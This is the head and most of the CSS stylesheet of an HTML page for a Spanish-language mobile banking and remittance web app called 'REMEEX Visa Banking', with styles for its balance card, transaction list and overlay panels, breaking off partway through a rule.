<!DOCTYPE html>
<html lang="es">
<head>
  <script src="repair.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>REMEEX Visa Banking</title>
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
  <link rel="apple-touch-icon" href="visabluapple.png">
  <meta name="description" content="Remeex VISA: transferencias globales sin comisiones, rapidas y seguras."/>
  <meta name="keywords" content="remesas, transferencias internacionales, enviar dinero, VISA"/>
  <meta name="author" content="Remeex VISA"/>
  <meta name="robots" content="index, follow"/>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/v-mask@2.3.0/dist/v-mask.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/gsap@3.11.4/dist/gsap.min.js"></script>
  <script src="bank-data.js"></script>
  <script src="js/validation-amounts.js"></script>

  <style>
    :root {
      /* Modern color palette based on Revolut/N26 style */
      --primary: #1a1f71;
      --primary-dark: #0c1045;
      --primary-light: #3244b6;
      --secondary: #00579f;
      --accent: #f7b600;
      --success: #00d34d;
      --danger: #ff4d4d;
      --warning: #ffad33;
      --info: #0095ff;
      --neutral-100: #ffffff;
      --neutral-200: #f5f7fa;
      --neutral-300: #eaecf0;
      --neutral-400: #d0d5dd;
      --neutral-500: #9da4b4;
      --neutral-600: #6e7891;
      --neutral-700: #4f5d75;
      --neutral-800: #293249;
      --neutral-900: #1a1f37;

      /* Shadows & Effects */
      --shadow-sm: 0 1px 3px rgba(16, 24, 40, 0.1);
      --shadow-md: 0 4px 8px -2px rgba(16, 24, 40, 0.1), 0 2px 4px -2px rgba(16, 24, 40, 0.06);
      --shadow-lg: 0 12px 16px -4px rgba(16, 24, 40, 0.08), 0 4px 6px -2px rgba(16, 24, 40, 0.03);
      --shadow-xl: 0 20px 24px -4px rgba(16, 24, 40, 0.08), 0 8px 8px -4px rgba(16, 24, 40, 0.03);
      --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06);
      
      /* Border radius */
      --radius-sm: 6px;
      --radius-md: 12px;
      --radius-lg: 16px;
      --radius-xl: 24px;
      --radius-full: 9999px;
      
      /* Transitions */
      --transition-fast: all 0.2s ease;
      --transition-base: all 0.3s ease;
      --transition-slow: all 0.5s ease;
      
      /* Card gradients */
      --card-gradient: linear-gradient(135deg, #1a1f71 0%, #0c1045 100%);
      --success-gradient: linear-gradient(135deg, #00c057 0%, #00a346 100%);
      
      /* Animations */
      --animation-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);

      /* Visa color helpers */
      --visa-blue: var(--primary);
      --visa-yellow: var(--accent);
      --success-green: var(--success);
      --danger-red: var(--danger);
      --warning-orange: var(--warning);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', 'Roboto', system-ui, sans-serif;
      font-size: 0.875rem; /* = 14px */
      color: #1f2937;
      background: var(--neutral-200);
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
      height: 100vh;
      margin: 0;
      position: relative;
    }
    
    /* Scrollbars */
    ::-webkit-scrollbar {
      width: 6px;
      height: 6px;
    }
    
    ::-webkit-scrollbar-track {
      background: var(--neutral-200);
    }
    
    ::-webkit-scrollbar-thumb {
      background: var(--neutral-500);
      border-radius: var(--radius-full);
    }
    
    /* Header */
    .app-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0.6rem 1rem;
      background: var(--neutral-100);
      border-bottom: 1px solid var(--neutral-300);
      box-shadow: var(--shadow-sm);
      z-index: 1000;
      height: 60px;
    }
    
    .header-brand {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .header-brand img {
      height: 32px;
      width: auto;
    }
    
    .header-actions {
      display: flex;
      align-items: center;
      gap: 0.25rem;
    }

    .header-action-btn {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--neutral-200);
      color: var(--neutral-700);
      border: none;
      cursor: pointer;
      transition: var(--transition-base);
      position: relative;
    }
    
    .header-action-btn:hover {
      background: var(--neutral-300);
      color: var(--neutral-900);
    }
    
    .notification-badge {
      position: absolute;
      top: -2px;
      right: -2px;
      background: var(--danger);
      color: white;
      border-radius: var(--radius-full);
      font-size: 0.6rem;
      width: 16px;
      height: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      border: 2px solid #fff;
    }
    
    /* Connected Users Badge */
    .users-online-badge {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.25rem 0.5rem;
      background: rgba(26, 31, 113, 0.08);
      border-radius: var(--radius-md);
      font-size: 0.7rem;
      color: var(--primary);
      font-weight: 500;
      white-space: nowrap;
    }
    
    .users-online-badge i {
      font-size: 0.7rem;
    }
    
    .pulse-dot {
      width: 6px;
      height: 6px;
      background-color: var(--success);
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
      0% {
        transform: scale(0.95);
        box-shadow: 0 0 0 0 rgba(0, 211, 77, 0.7);
      }
      
      70% {
        transform: scale(1);
        box-shadow: 0 0 0 4px rgba(0, 211, 77, 0);
      }
      
      100% {
        transform: scale(0.95);
        box-shadow: 0 0 0 0 rgba(0, 211, 77, 0);
      }
    }
    
    /* Account Balance Card */
    .balance-card {
      background: var(--card-gradient);
      border-radius: var(--radius-lg);
      padding: 1.25rem;
      color: white;
      box-shadow: var(--shadow-lg);
      position: relative;
      overflow: hidden;
      margin-bottom: 1.25rem;
      transition: transform 0.3s var(--animation-bounce), box-shadow 0.3s ease;
    }
    
    .balance-card:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-xl);
    }
    
    .balance-card::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      animation: shine 3s infinite;
    }
    
    @keyframes shine {
      100% { left: 200%; }
    }
    
    .card-decoration {
      position: absolute;
      right: -50px;
      bottom: -50px;
      width: 200px;
      height: 200px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
      z-index: 1;
    }
    
    .card-decoration:nth-child(2) {
      left: -30px;
      top: -30px;
      width: 150px;
      height: 150px;
    }
    
  .balance-content {
    position: relative;
    z-index: 2;
  }

  .header-right {
    display: flex;
    align-items: center;
    gap: 0.5rem;
  }

  .balance-controls {
    display: flex;
    gap: 0.25rem;
  }

  .balance-control-btn {
    background: rgba(255,255,255,0.2);
    border: none;
    color: white;
    width: 26px;
    height: 26px;
    border-radius: var(--radius-full);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.7rem;
    cursor: pointer;
    transition: background 0.2s;
  }

  .balance-control-btn:hover {
    background: rgba(255,255,255,0.3);
  }
    
    .balance-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.5rem;
    }
    
    .header-avatar {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: rgba(255, 255, 255, 0.2);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 0.8rem;
      flex-shrink: 0;
    }

    .balance-label {
      font-size: 0.8rem;
      opacity: 0.8;
      margin-bottom: 0.25rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .balance-label i {
      font-size: 0.9rem;
    }
    
    .balance-amount {
      /* Slightly larger to emphasize the main balance */
      font-size: clamp(1.575rem, 5.25vw, 2.36rem);
      font-weight: 700;
      margin: 0.5rem 0 0.75rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      flex-wrap: nowrap;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    .currency-flag {
      width: 20px;
      height: 14px;
      border-radius: 2px;
      object-fit: cover;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
      flex-shrink: 0;
    }
    
    .balance-equivalents {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
      margin-bottom: 0.75rem;
    }
    
    .balance-equivalent {
      background: rgba(255, 255, 255, 0.1);
      border-radius: var(--radius-md);
      padding: 0.4rem 0.6rem;
      font-size: 0.8rem;
      display: flex;
      align-items: center;
      gap: 0.4rem;
      backdrop-filter: blur(5px);
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      white-space: nowrap;
    }
    
    .exchange-rate {
      background: rgba(255, 255, 255, 0.15);
      border-radius: var(--radius-md);
      padding: 0.4rem 0.6rem;
      font-size: 0.75rem;
      margin-bottom: 0.75rem;
      display: inline-block;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 100%;
    }
    
    .balance-date {
      font-size: 0.7rem;
      opacity: 0.7;
      margin-bottom: 1rem;
    }

    /* Savings label inside balance card */
    .balance-savings .btn-outline {
      color: #fff;
      border-color: rgba(255, 255, 255, 0.85);
    }

    .balance-savings .btn-outline:hover {
      background: rgba(255, 255, 255, 0.2);
    }
    
    .balance-actions {
      display: flex;
      gap: 0.75rem;
      margin-top: 0.75rem;
    }
    
    .balance-btn {
      flex: 1;
      border: none;
      border-radius: var(--radius-md);
      height: 42px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 0.8rem;
      background: rgba(255,255,255,0.15);
      color: white;
      cursor: pointer;
      transition: all 0.3s var(--animation-bounce);
      backdrop-filter: blur(5px);
      white-space: nowrap;
    }
    
    .balance-btn:hover {
      background: rgba(255,255,255,0.25);
      transform: translateY(-3px);
    }
    
    .balance-btn:active {
      transform: translateY(0);
    }
    
    .balance-btn i {
      margin-right: 6px;
      font-size: 0.9rem;
    }
    
    /* Pending transactions badge */
    .pending-transaction-badge {
      background: rgba(255, 255, 255, 0.2);
      border-left: 3px solid var(--accent);
      border-radius: var(--radius-md);
      padding: 0.6rem;
      margin-top: 0.6rem;
      font-size: 0.75rem;
      color: var(--neutral-100);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .pending-transaction-badge i {
      color: var(--accent);
      font-size: 0.9rem;
      flex-shrink: 0;
    }

    /* Rejected transactions badge */
    .rejected-transaction-badge {
      background: rgba(255, 255, 255, 0.2);
      border-left: 3px solid var(--danger);
      border-radius: var(--radius-md);
      padding: 0.6rem;
      margin-top: 0.6rem;
      font-size: 0.75rem;
      color: var(--neutral-100);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .rejected-transaction-badge i {
      color: var(--danger);
      font-size: 0.9rem;
      flex-shrink: 0;
    }
    
    /* Dashboard Layout */
    .app-container {
      padding-top: 70px;
      padding-bottom: 70px;
      max-width: 100%;
      margin: 0 auto;
      height: 100vh;
      overflow-y: auto;
      overflow-x: hidden;
      position: relative;
    }
    
    .dashboard-content {
      padding: 0.75rem;
      max-width: 1200px;
      margin: 0 auto;
    }
   
    /* Sections */
    .section-title {
      font-size: 1rem;
      font-weight: 600;
      color: var(--neutral-900);
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    
    .section-title i {
      margin-right: 0.5rem;
      color: var(--primary);
    }
    
    .section-title a {
      font-size: 0.7rem;
      color: var(--primary);
      text-decoration: none;
    }
    
    /* Cards */
    .card {
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      box-shadow: var(--shadow-sm);
      padding: 1rem;
      margin-bottom: 1.25rem;
      transition: transform 0.3s var(--animation-bounce), box-shadow 0.3s ease;
    }
    
    .card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }
    
    /* Transactions */
    .transaction-list {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .transaction-actions {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      margin-bottom: 0.75rem;
    }

    .transaction-actions select {
      flex: 1;
      padding: 0.25rem 0.5rem;
      border-radius: var(--radius-sm);
      border: 1px solid var(--neutral-300);
    }

    .add-widget-btn {
      background: var(--primary);
      border: none;
      color: white;
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      flex-shrink: 0;
    }
    
    .transaction-item {
      display: grid;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      gap: 0.5rem;
      padding: 0.6rem;
      background: var(--neutral-100);
      border-radius: var(--radius-md);
      transition: all 0.3s ease;
      box-shadow: var(--shadow-sm);
    }
    
    .transaction-item:hover {
      background: var(--neutral-200);
      transform: translateX(5px);
      box-shadow: var(--shadow-md);
    }
    
    .transaction-icon {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1rem;
      flex-shrink: 0;
    }
    
    .transaction-icon.deposit {
      background: var(--success);
      color: white;
    }
    
    .transaction-icon.withdraw {
      background: var(--danger);
      color: white;
    }
    
    .transaction-icon.transfer {
      background: var(--primary-light);
      color: white;
    }
    
    .transaction-icon.pending {
      background: var(--primary);
      color: white;
    }

    .transaction-icon.rejected {
      background: var(--danger);
      color: white;
    }
    
    .transaction-content {
      flex: 1;
      min-width: 0;
    }
    
    .transaction-title {
      font-weight: 600;
      font-size: 0.75rem;
      color: var(--neutral-900);
      margin-bottom: 0.125rem;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      flex-wrap: wrap;
    }
    
    .transaction-badge {
      display: inline-flex;
      align-items: center;
      padding: 0.125rem 0.375rem;
      border-radius: var(--radius-sm);
      font-size: 0.6rem;
      font-weight: 600;
      text-transform: uppercase;
      margin-top: 1px;
    }
    
    .transaction-badge.pending {
      background: rgba(26, 31, 113, 0.15); /* Visa blue tint */
      color: var(--primary);
    }
    
    .transaction-badge.processing {
      background: rgba(0, 149, 255, 0.15);
      color: var(--info);
    }

    .transaction-badge.rejected {
      background: rgba(255, 77, 77, 0.15);
      color: var(--danger);
    }

    .transaction-badge.validation {
      background: rgba(0, 149, 255, 0.15);
      color: var(--info);
    }
    
    .transaction-details {
      display: flex;
      align-items: center;
      flex-wrap: wrap;
      gap: 0.4rem;
      font-size: 0.65rem;
      color: var(--neutral-600);
    }
    
    .transaction-date {
      display: flex;
      align-items: center;
      gap: 0.25rem;
    }
    
    .transaction-date i {
      font-size: 0.7rem;
    }
    
    .transaction-category {
      display: flex;
      align-items: center;
      gap: 0.25rem;
    }
    
    .transaction-category i {
      font-size: 0.7rem;
    }

    .transaction-bank-logo {
      height: 16px;
      width: auto;
    }
    
    .transaction-amount {
      font-weight: 600;
      font-size: 0.8rem;
      white-space: nowrap;
      flex-shrink: 0;
    }
    
    .transaction-amount.deposit {
      color: var(--success);
    }
    
    .transaction-amount.withdraw {
      color: var(--danger);
    }
    
    .transaction-amount.pending {
      color: var(--primary);
    }

    .transaction-amount.rejected {
      color: var(--danger);
    }
    
    .bank-logo-mini {
      height: 14px;
      width: auto;
      vertical-align: middle;
      margin-left: 0.25rem;
    }
    .country-flag-mini {
      height: 14px;
      width: auto;
      vertical-align: middle;
      margin-left: 0.25rem;
    }
    .verification-progress-percent {
      font-size: 0.75rem;
      text-align: right;
      margin-top: 0.25rem;
      color: var(--neutral-700);
      display: none;
    }
    /* Navigation Bar */
    .bottom-nav {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      display: flex;
      justify-content: space-around;
      padding: 0.5rem 0;
      box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.05);
      z-index: 900;
    }
    
    .nav-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0.25rem;
      padding: 0.4rem;
      border-radius: var(--radius-md);
      transition: var(--transition-base);
      cursor: pointer;
      flex: 1;
    }
    
    .nav-item.active {
      color: var(--primary);
    }
    
    .nav-icon {
      font-size: 1.1rem;
      transition: transform 0.3s var(--animation-bounce);
    }
    
    .nav-item:hover .nav-icon {
      transform: translateY(-3px);
    }
    
    .nav-label {
      font-size: 0.6rem;
      font-weight: 600;
    }

    /* Service Overlay */
    .service-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .service-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 90vh;
      overflow-y: auto;
    }

    .service-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .service-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .service-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .service-close:hover {
      background: var(--neutral-300);
    }

    .service-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 1rem;
    }

    .service-item {
      background: var(--neutral-200);
      border-radius: var(--radius-md);
      padding: 1rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0.75rem;
      transition: all 0.3s var(--animation-bounce);
      text-align: center;
    }

    .service-item:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-md);
    }

    .service-icon {
      width: 50px;
      height: 50px;
      border-radius: var(--radius-full);
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
    }

    .service-icon.bills {
      background: var(--secondary);
    }


    .service-icon.withdrawal {
      background: var(--warning);
    }

    .service-icon.shopping {
      background: var(--primary);
    }

    .service-icon.zelle {
      background: var(--info);
    }

    .service-icon.exchange {
      background: var(--accent);
      color: var(--neutral-900);
    }

    .service-icon.reviews {
      background: var(--warning);
    }

    .service-icon.chat {
      background: var(--primary-light);
    }

    .service-icon.us-account {
      background: var(--primary-dark);
    }

    .service-icon.savings {
      background: var(--success);
    }

    .service-icon.wallets {
      background: var(--primary-light);
    }

    .service-icon.crypto {
      background: #f7931a;
    }

    .service-icon.market {
      background: var(--secondary);
    }

    .service-icon.p2p {
      background: var(--primary-light);
    }

    .service-icon.donation {
      background: var(--danger);
    }

    .service-name {
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--neutral-900);
    }

    .service-description {
      font-size: 0.7rem;
      color: var(--neutral-600);
    }

    /* Cards Overlay */
    .cards-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .card-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
    }

    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .card-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .card-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .card-close:hover {
      background: var(--neutral-300);
    }

    .virtual-card {
      background: var(--card-gradient);
      border-radius: var(--radius-lg);
      height: 200px;
      width: 100%;
      max-width: 350px;
      margin: 0 auto 1.5rem;
      padding: 1.25rem;
      box-shadow: var(--shadow-lg);
      position: relative;
      overflow: hidden;
      color: white;
    }

    .virtual-card::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      animation: shine 3s infinite;
    }

    .card-logo {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      margin-bottom: 2rem;
    }

    .card-chip {
      width: 40px;
      height: auto;
      flex-shrink: 0;
    }

    .card-brand {
      width: 55px;
      height: auto;
      flex-shrink: 0;
    }

    .card-number {
      font-size: 1.25rem;
      letter-spacing: 1px;
      margin-bottom: 1.25rem;
      font-family: monospace;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .card-details {
      display: flex;
      justify-content: space-between;
      font-size: 0.8rem;
    }

    .card-apps {
      display: flex;
      flex-wrap: wrap;
      gap: 1rem;
      margin-top: 1.5rem;
      margin-bottom: 2rem;
    }

    .card-app {
      width: 46px;
      height: 46px;
      border-radius: var(--radius-md);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      color: var(--neutral-800);
    }

    .card-text {
      text-align: center;
      font-size: 0.9rem;
      color: var(--neutral-600);
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }

    /* Messages Overlay */
    .messages-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .messages-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 80vh;
      overflow-y: auto;
    }

    .messages-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .messages-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .messages-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .messages-close:hover {
      background: var(--neutral-300);
    }

    .message-item {
      display: flex;
      gap: 1rem;
      padding: 1rem;
      border-radius: var(--radius-md);
      background: var(--neutral-200);
      margin-bottom: 1rem;
    }

    .message-icon {
      width: 40px;
      height: 40px;
      border-radius: var(--radius-full);
      background: var(--primary);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.1rem;
      flex-shrink: 0;
    }

    .message-icon.welcome {
      background: var(--success);
    }

    .message-icon.verify {
      background: var(--warning);
    }

    .message-icon.security {
      background: var(--info);
    }

    .message-content {
      flex: 1;
    }

    .message-title {
      font-weight: 600;
      font-size: 0.9rem;
      margin-bottom: 0.25rem;
      color: var(--neutral-900);
    }

    .message-text {
      font-size: 0.8rem;
      color: var(--neutral-600);
    }

    .message-time {
      font-size: 0.7rem;
      color: var(--neutral-500);
      margin-top: 0.5rem;
    }

    /* Exchange Overlay */
    .exchange-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .exchange-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 80vh;
      overflow-y: auto;
    }

    .exchange-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
      padding-bottom: 0.5rem;
      border-bottom: 1px solid var(--neutral-300);
    }

    .exchange-info {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-bottom: 1rem;
    }

    .exchange-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .exchange-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .exchange-close:hover {
      background: var(--neutral-300);
    }

    .exchange-nav {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1rem;
    }

    .exchange-tab {
      flex: 1;
      padding: 0.5rem;
      background: var(--neutral-200);
      border: none;
      border-radius: var(--radius-md);
      cursor: pointer;
      font-weight: 600;
    }

    .exchange-tab.active {
      background: var(--primary);
      color: white;
    }

    .exchange-form {
      display: none;
      flex-direction: column;
      gap: 0.75rem;
    }

    .exchange-form input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1px solid var(--neutral-400);
      border-radius: var(--radius-md);
      font-size: 0.9rem;
      background: var(--neutral-100);
      transition: var(--transition-base);
    }

    .exchange-form input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.15);
    }

    .exchange-form select,
    .exchange-form textarea {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1px solid var(--neutral-400);
      border-radius: var(--radius-md);
      font-size: 0.9rem;
      background: var(--neutral-100);
      transition: var(--transition-base);
    }

    .exchange-form select:focus,
    .exchange-form textarea:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.15);
    }

    .exchange-inline {
      display: flex;
      gap: 0.5rem;
    }

    .exchange-inline select {
      width: 6rem;
    }

    .exchange-balance {
      display: flex;
      gap: 0.75rem;
      font-size: 0.8rem;
      color: var(--neutral-700);
      margin-bottom: 1rem;
    }

    .exchange-form button {
      width: 100%;
    }

    .exchange-form.active {
      display: flex;
    }

    .exchange-status {
      margin-top: 1rem;
      text-align: center;
      font-size: 0.9rem;
    }

    .history-title {
      margin-top: 1rem;
      font-weight: 600;
    }

    .exchange-history {
      margin-top: 1.5rem;
      font-size: 0.8rem;
    }

    .history-item {
      padding: 0.5rem 0;
      border-bottom: 1px solid var(--neutral-300);
    }

    .history-item:last-child {
      border-bottom: none;
    }

    .history-date {
      font-size: 0.7rem;
      color: var(--neutral-600);
    }

    .no-history {
      text-align: center;
      color: var(--neutral-600);
    }

    /* Transfer Overlay */
    .transfer-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .transfer-container {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-radius: 0;
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      height: 100vh;
      overflow-y: auto;
    }

    /* Support Overlay */
    .support-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .support-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 80vh;
      overflow-y: auto;
      text-align: left;
    }

    .support-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .support-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      text-align: left;
    }

    .support-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .support-close:hover {
      background: var(--neutral-300);
    }

    /* Settings Overlay */
    .settings-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .settings-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
      border-top-right-radius: var(--radius-lg);
      padding: 1.5rem;
      animation: slideUp 0.4s ease;
      max-height: 80vh;
      overflow-y: auto;
    }

    .settings-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .settings-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .settings-close {
      width: 32px;
      height: 32px;
      border-radius: var(--radius-full);
      background: var(--neutral-200);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .settings-close:hover {
      background: var(--neutral-300);
    }

    /* Savings Overlay */
    .savings-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      z-index: 1000;
      animation: fadeIn 0.3s ease;
    }

    .savings-container {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--neutral-100);
      border-top-left-radius: var(--radius-lg);
